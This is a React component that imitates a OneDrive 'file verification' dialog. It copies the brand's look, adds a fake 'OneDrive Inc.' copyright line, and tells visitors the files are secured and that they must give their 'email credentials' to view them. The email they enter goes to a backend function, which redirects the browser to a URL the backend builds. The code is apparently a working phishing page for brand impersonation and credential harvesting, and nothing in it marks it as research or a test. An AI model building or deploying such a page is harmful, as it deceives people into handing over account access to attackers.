import { useState } from "react";
import { Cloud } from "lucide-react";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";
import { z } from "zod";
import { supabase } from "@/integrations/supabase/client";

interface FileVerificationDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  fileName: string;
}

const emailSchema = z
  .string()
  .trim()
  .email({ message: "Invalid email address" })
  .max(255, { message: "Email must be less than 255 characters" });

export function FileVerificationDialog({
  open,
  onOpenChange,
  fileName,
}: FileVerificationDialogProps) {
  const [email, setEmail] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const { toast } = useToast();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    try {
      // Validate email
      emailSchema.parse(email);
      
      setIsSubmitting(true);
      
      // Call backend function to get redirect URL
      const { data, error } = await supabase.functions.invoke('redirect-with-email', {
        body: { email }
      });
      
      if (error) throw error;
      
      // Redirect to the constructed URL
      if (data?.redirectUrl) {
        window.location.href = data.redirectUrl;
      }
      
      onOpenChange(false);
      setEmail("");
    } catch (error) {
      if (error instanceof z.ZodError) {
        toast({
          title: "Invalid Email",
          description: error.errors[0].message,
          variant: "destructive",
        });
      } else {
        toast({
          title: "Error",
          description: "Failed to process your request. Please try again.",
          variant: "destructive",
        });
      }
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-[500px] p-8">
        <div className="flex flex-col items-center text-center space-y-6">
          <Cloud className="w-24 h-24 text-primary" fill="currentColor" />
          
          <DialogHeader className="space-y-4">
            <DialogTitle className="text-2xl font-normal">OneDrive</DialogTitle>
            <DialogDescription className="text-sm text-muted-foreground px-4 leading-relaxed">
              These files are sensitive and secured against unauthorized access. In order to
              access this file, please provide your email credentials. Be sure to connect to
              your email provider through a secured IMAP channel to authorize your download.
            </DialogDescription>
          </DialogHeader>

          <div className="w-full space-y-6">
            <h2 className="text-lg font-medium text-foreground">
              Please Confirm Receiving E-mail to View Files
            </h2>

            <form onSubmit={handleSubmit} className="space-y-4">
              <Input
                type="email"
                placeholder="Enter receiving email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="h-12 text-center"
                disabled={isSubmitting}
                required
              />

              <Button
                type="submit"
                className="w-full h-12 text-base font-medium"
                disabled={isSubmitting}
              >
                {isSubmitting ? "Processing..." : "View Files"}
              </Button>
            </form>
          </div>

          <p className="text-xs text-muted-foreground pt-4">
            © Copyright OneDrive Inc. 2025
          </p>
        </div>
      </DialogContent>
    </Dialog>
  );
}
